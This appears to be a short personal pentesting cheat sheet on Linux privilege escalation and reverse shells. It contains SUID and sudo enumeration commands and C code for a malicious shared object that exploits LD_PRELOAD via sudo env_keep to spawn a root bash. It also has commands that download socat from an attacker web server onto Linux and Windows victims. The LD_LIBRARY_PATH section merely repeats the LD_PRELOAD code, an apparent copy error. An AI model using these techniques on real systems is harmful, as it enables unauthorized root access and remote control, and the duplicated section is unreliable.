#PrivEscalation

1. ** python -c 'import pty;pty.spawn("/bin/bash")' ** <== for a better listener shell experience

2. ** sudo -l **

3. ** find / -perm /6000 2>/dev/null | grep '/bin' ** <== find interesting tools that can exploit shell

4. https://gtfobins.github.io/ followed the interesting tools that can exploit 

5. 
###Take advantage of LD_PRELOAD in evn_keep

```#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
###Take advantage of LD_LIBRARY_PATH in evn_keep
```#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```


6. 
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker


#Reverse Shell:
1. https://www.revshells.com/
2. MonkeyPenTest
3. Start webserver using python "sudo python3 -m http.server 80" then download files from victim shell 
Linux :"wget <LOCAL-IP>/socat -O /tmp/socat"
Windows: "Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe"

